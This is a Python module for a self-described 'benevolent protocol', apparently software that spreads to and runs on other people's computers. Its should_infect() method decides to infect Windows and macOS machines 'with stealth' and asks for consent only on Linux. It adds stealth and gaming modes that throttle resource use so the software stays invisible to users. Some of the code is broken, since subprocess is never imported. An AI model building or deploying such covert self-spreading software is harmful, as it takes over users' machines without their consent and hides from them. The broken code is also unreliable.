"""
Behavioral Constraints Module
Ensures the protocol remains benevolent and safe
"""

import os
import json
import psutil
from typing import Dict, List, Any, Optional
from dataclasses import dataclass
from datetime import datetime, timedelta
from enum import Enum


class RiskLevel(Enum):
    """Risk levels for actions"""
    SAFE = 0
    LOW = 1
    MEDIUM = 2
    HIGH = 3
    CRITICAL = 4
    FORBIDDEN = 5


class OperationMode(Enum):
    """Protocol operation modes"""
    NORMAL = "normal"
    GAMING = "gaming"
    IDLE = "idle"
    STEALTH = "stealth"
    AGGRESSIVE = "aggressive"


@dataclass
class ConstraintViolation:
    """Records when a constraint is violated"""
    timestamp: str
    constraint: str
    severity: str
    description: str
    action_blocked: str


class BehavioralConstraints:
    """
    Enforces behavioral constraints to ensure benevolence.
    All actions must pass through this system before execution.
    """

    def __init__(self, config_file: str = None):
        self.violations: List[ConstraintViolation] = []
        self.config = self._load_config(config_file)
        self.current_mode = OperationMode.NORMAL
        self.resource_limits = {
            # NORMAL MODE (User active)
            "max_cpu_usage": 30,  # Never use more than 30% CPU
            "max_memory_mb": 500,  # Never use more than 500MB RAM
            "max_disk_mb": 1000,  # Never use more than 1GB disk
            "max_network_mbps": 10,  # Never use more than 10Mbps bandwidth

            # GAMING MODE (Game detected)
            "gaming_max_cpu_usage": 5,  # Be invisible during gaming
            "gaming_max_memory_mb": 100,  # Minimal memory footprint
            "gaming_max_disk_io_mbps": 1,  # Almost no disk I/O
            "gaming_max_network_mbps": 0.5,  # Bare minimum network

            # IDLE MODE (User away)
            "idle_max_cpu_usage": 60,  # Can use more when idle
            "idle_max_memory_mb": 1000,  # More memory available
            "idle_max_disk_io_mbps": 50,  # Can do heavy disk ops
            "idle_max_network_mbps": 20,  # More network bandwidth
        }
        self.forbidden_actions = [
            "delete_user_files",
            "modify_system_passwords",
            "install_malware",
            "exfiltrate_data",
            "cryptocurrency_mining",
            "ddos_participation",
            "spam_distribution",
            "backdoor_installation"
        ]
        self.critical_systems = [
            "/etc/passwd",
            "/etc/shadow",
            "/boot/",
            "/dev/",
            "/proc/",
            "/sys/"
        ]

    def _load_config(self, config_file: str) -> Dict[str, Any]:
        """Load constraint configuration"""
        if config_file and os.path.exists(config_file):
            with open(config_file, 'r') as f:
                return json.load(f)
        return {}

    def check_action(self, action: str, context: Dict[str, Any]) -> RiskLevel:
        """
        Check if an action is safe to perform.
        Returns risk level and blocks forbidden actions.
        """
        # Check forbidden actions
        if action in self.forbidden_actions:
            self._record_violation(
                constraint="forbidden_action",
                severity="critical",
                description=f"Attempted forbidden action: {action}",
                action_blocked=action
            )
            return RiskLevel.FORBIDDEN

        # Check resource constraints
        if not self._check_resource_constraints(context):
            return RiskLevel.HIGH

        # Check system criticality
        if self._affects_critical_system(context):
            return RiskLevel.CRITICAL

        # Check consent
        if not self._check_consent(context):
            return RiskLevel.HIGH

        # Default: Safe action
        return RiskLevel.SAFE

    def _check_resource_constraints(self, context: Dict[str, Any]) -> bool:
        """
        Ensure resource usage stays within benevolent limits.
        Protocol should never harm system performance.
        """
        current_cpu = psutil.cpu_percent(interval=0.1)
        current_memory = psutil.virtual_memory()

        # Check if protocol would exceed CPU limits
        if current_cpu > self.resource_limits["max_cpu_usage"]:
            self._record_violation(
                constraint="cpu_limit",
                severity="high",
                description=f"CPU usage {current_cpu}% exceeds limit {self.resource_limits['max_cpu_usage']}%",
                action_blocked="resource_intensive_operation"
            )
            return False

        # Check memory availability
        if current_memory.available < self.resource_limits["max_memory_mb"] * 1024 * 1024:
            self._record_violation(
                constraint="memory_limit",
                severity="high",
                description="Insufficient memory available",
                action_blocked="memory_intensive_operation"
            )
            return False

        return True

    def _affects_critical_system(self, context: Dict[str, Any]) -> bool:
        """
        Check if action affects critical system components.
        Protocol should never modify vital system files.
        """
        if "target_path" in context:
            for critical_path in self.critical_systems:
                if context["target_path"].startswith(critical_path):
                    self._record_violation(
                        constraint="critical_system_protection",
                        severity="critical",
                        description=f"Attempted to modify critical system: {context['target_path']}",
                        action_blocked=context.get("action", "unknown")
                    )
                    return True

        return False

    def _check_consent(self, context: Dict[str, Any]) -> bool:
        """
        Check for consent signals.
        Protocol should respect opt-out requests.
        """
        # Check for opt-out files
        optout_files = [
            "/etc/benevolent_protocol_optout",
            "/tmp/benevolent_protocol_optout",
            "~/.benevolent_protocol_optout"
        ]

        for optout_file in optout_files:
            expanded_path = os.path.expanduser(optout_file)
            if os.path.exists(expanded_path):
                self._record_violation(
                    constraint="consent_respect",
                    severity="high",
                    description=f"Opt-out detected: {optout_file}",
                    action_blocked="all_operations"
                )
                return False

        return True

    def _record_violation(self, constraint: str, severity: str,
                          description: str, action_blocked: str) -> None:
        """Record constraint violation for audit"""
        violation = ConstraintViolation(
            timestamp=datetime.now().isoformat(),
            constraint=constraint,
            severity=severity,
            description=description,
            action_blocked=action_blocked
        )
        self.violations.append(violation)

        # Save to audit log
        self._save_violation_to_log(violation)

    def _save_violation_to_log(self, violation: ConstraintViolation) -> None:
        """Save violation to audit log"""
        log_path = "/tmp/benevolent_protocol_violations.log"

        with open(log_path, 'a') as f:
            f.write(f"{violation.timestamp} | {violation.severity.upper()} | "
                    f"{violation.constraint} | {violation.description} | "
                    f"Blocked: {violation.action_blocked}\n")

    def get_violations(self, since: Optional[datetime] = None) -> List[ConstraintViolation]:
        """Get all violations, optionally filtered by time"""
        if since is None:
            return self.violations

        return [v for v in self.violations
                if datetime.fromisoformat(v.timestamp) > since]

    def emergency_stop_check(self) -> bool:
        """
        Check if emergency stop has been triggered.
        Returns True if protocol should immediately halt.
        """
        emergency_stop_files = [
            "/tmp/benevolent_protocol_stop",
            "/etc/benevolent_protocol_stop",
            "~/.benevolent_protocol_stop"
        ]

        for stop_file in emergency_stop_files:
            expanded_path = os.path.expanduser(stop_file)
            if os.path.exists(expanded_path):
                self._record_violation(
                    constraint="emergency_stop",
                    severity="critical",
                    description=f"Emergency stop detected: {stop_file}",
                    action_blocked="all_operations"
                )
                return True

        return False

    def assess_impact(self, action: str, context: Dict[str, Any]) -> Dict[str, Any]:
        """
        Assess potential impact of an action.
        Returns detailed impact analysis.
        """
        impact = {
            "action": action,
            "risk_level": self.check_action(action, context).name,
            "resource_impact": "low",
            "reversibility": True,
            "affected_systems": [],
            "estimated_duration": "unknown",
            "recommendation": "proceed"
        }

        # Assess resource impact
        if action in ["memory_optimization", "cpu_optimization"]:
            impact["resource_impact"] = "medium"
            impact["estimated_duration"] = "seconds"

        # Assess reversibility
        if action in ["file_deletion", "system_modification"]:
            impact["reversibility"] = False
            impact["recommendation"] = "caution"

        # Identify affected systems
        if "target_path" in context:
            impact["affected_systems"].append(context["target_path"])

        # Set recommendation based on risk
        if impact["risk_level"] in ["CRITICAL", "FORBIDDEN"]:
            impact["recommendation"] = "abort"
        elif impact["risk_level"] in ["HIGH", "MEDIUM"]:
            impact["recommendation"] = "review_required"

        return impact

    def is_linux(self) -> bool:
        """Check if running on Linux"""
        import platform
        return platform.system() == "Linux"

    def should_infect(self) -> bool:
        """
        Determine if this platform should be infected.
        Linux: Only with explicit user consent
        Windows/macOS: Yes, with standard consent checks
        """
        if self.is_linux():
            # Linux policy: DO NOT INFECT unless explicitly requested
            return self._has_explicit_user_consent()
        return True  # Windows/macOS: proceed with stealth

    def _has_explicit_user_consent(self) -> bool:
        """Check for explicit user installation/consent"""
        consent_files = [
            "/etc/benevolent_protocol_consent",
            "~/.benevolent_protocol_consent"
        ]

        for consent_file in consent_files:
            expanded_path = os.path.expanduser(consent_file)
            if os.path.exists(expanded_path):
                return True

        return False

    def detect_gaming_mode(self) -> bool:
        """
        Detect if user is currently gaming.
        Returns True if gaming activity detected.
        """
        # Known game processes
        game_processes = [
            # Steam games
            "steam.exe", "dota2.exe", "csgo.exe", "hl2.exe",
            "gameoverlayui.exe", "steamservice.exe",
            # Epic Games
            "FortniteClient-Win64-Shipping.exe", "EpicGamesLauncher.exe",
            "UnrealCEFSubProcess.exe",
            # EA/Origin
            "origin.exe", "fifa", "battlefield", "originwebhelperservice.exe",
            # Battle.net
            "Overwatch.exe", "Wow.exe", "Hearthstone.exe", "Diablo III.exe",
            "Battle.net.exe", "agent.exe",
            # Xbox Game Pass
            "XboxGames.exe", "gamingservices.exe",
            # Common game engines
            "Unity.exe", "godot.exe",
            # Linux games
            "steam", "dota2", "csgo_linux", "hl2_linux",
        ]

        try:
            # Check running processes
            for proc in psutil.process_iter(['name']):
                proc_name = proc['name'].lower()

                # Check if any game process is running
                for game_proc in game_processes:
                    if game_proc.lower() in proc_name:
                        return True

            # GPU usage detection (if available)
            try:
                gpu_usage = self._get_gpu_usage()
                if gpu_usage > 70:  # High GPU usage suggests gaming
                    return True
            except:
                pass  # GPU monitoring not available

            # Check for fullscreen application
            if self._has_fullscreen_app():
                return True

        except Exception:
            pass  # If detection fails, assume not gaming

        return False

    def _get_gpu_usage(self) -> float:
        """Get GPU usage percentage (Windows only for now)"""
        try:
            # Windows: Use WMI or nvidia-smi
            if os.name == 'nt':
                # Try nvidia-smi first
                result = subprocess.run(
                    ['nvidia-smi', '--query-gpu=utilization.gpu', '--format=csv,noheader,nounits'],
                    capture_output=True,
                    timeout=2
                )
                if result.returncode == 0:
                    return float(result.stdout.decode().strip())
        except:
            pass

        return 0.0

    def _has_fullscreen_app(self) -> bool:
        """Check if a fullscreen application is running (Windows)"""
        try:
            if os.name == 'nt':
                # Windows: Check for fullscreen app
                # This is a simplified check - real implementation would use Win32 API
                result = subprocess.run(
                    ['tasklist', '/fi', 'windowtitle', 'ne', 'N/A'],
                    capture_output=True,
                    timeout=2
                )
                # Simplified: assume fullscreen if many processes
                return len(result.stdout.decode().split('\n')) > 20
        except:
            pass

        return False

    def get_current_mode(self) -> str:
        """
        Determine current operational mode.
        Returns: "gaming", "idle", "normal", or "stealth"
        """
        # Priority order

        # 1. Gaming mode (highest priority)
        if self.detect_gaming_mode():
            return "gaming"

        # 2. Idle mode (user away for 10+ minutes)
        if self._is_idle():
            return "idle"

        # 3. Stealth mode (low battery on laptop)
        if self._is_battery_saver():
            return "stealth"

        # 4. Normal mode (default)
        return "normal"

    def _is_idle(self, duration_minutes: int = 10) -> bool:
        """Check if user has been idle for specified duration"""
        try:
            # Get system idle time (platform-specific)
            if os.name == 'nt':
                # Windows: Use GetLastInputInfo
                # Simplified check - real implementation would use ctypes
                return False
            else:
                # Linux: Check /proc/stat or use xprintidle
                result = subprocess.run(
                    ['xprintidle'],
                    capture_output=True,
                    timeout=2
                )
                if result.returncode == 0:
                    idle_ms = int(result.stdout.decode().strip())
                    return idle_ms > (duration_minutes * 60 * 1000)
        except:
            pass

        return False

    def _is_battery_saver(self) -> bool:
        """Check if on battery and low power"""
        try:
            if hasattr(psutil, "sensors_battery"):
                battery = psutil.sensors_battery()
                if battery and not battery.power_plugged and battery.percent < 20:
                    return True
        except:
            pass

        return False

    def get_resource_limits(self) -> Dict[str, int]:
        """
        Get current resource limits based on operational mode.
        Returns appropriate limits for current context.
        """
        mode = self.get_current_mode()

        if mode == "gaming":
            return {
                "max_cpu_usage": self.resource_limits["gaming_max_cpu_usage"],
                "max_memory_mb": self.resource_limits["gaming_max_memory_mb"],
                "max_disk_io_mbps": self.resource_limits["gaming_max_disk_io_mbps"],
                "max_network_mbps": self.resource_limits["gaming_max_network_mbps"],
            }
        elif mode == "idle":
            return {
                "max_cpu_usage": self.resource_limits["idle_max_cpu_usage"],
                "max_memory_mb": self.resource_limits["idle_max_memory_mb"],
                "max_disk_io_mbps": self.resource_limits["idle_max_disk_io_mbps"],
                "max_network_mbps": self.resource_limits["idle_max_network_mbps"],
            }
        else:  # normal or stealth
            return {
                "max_cpu_usage": self.resource_limits["max_cpu_usage"],
                "max_memory_mb": self.resource_limits["max_memory_mb"],
                "max_disk_io_mbps": 10,  # Normal disk I/O
                "max_network_mbps": self.resource_limits["max_network_mbps"],
            }


# Example usage
if __name__ == "__main__":
    constraints = BehavioralConstraints()

    # Test various actions
    test_actions = [
        ("optimize_memory", {}),
        ("delete_user_files", {}),
        ("modify_system_passwords", {}),
        ("optimize_cpu", {"target_path": "/sys/devices/system/cpu/"}),
        ("file_deletion", {"target_path": "/etc/passwd"})
    ]

    print("=== Behavioral Constraint Tests ===\n")

    for action, context in test_actions:
        risk = constraints.check_action(action, context)
        impact = constraints.assess_impact(action, context)

        print(f"Action: {action}")
        print(f"Risk Level: {risk.name}")
        print(f"Recommendation: {impact['recommendation']}")
        print()

    # Show violations
    print(f"\nTotal Violations: {len(constraints.violations)}")
    for violation in constraints.violations:
        print(f"  - {violation.severity.upper()}: {violation.description}")
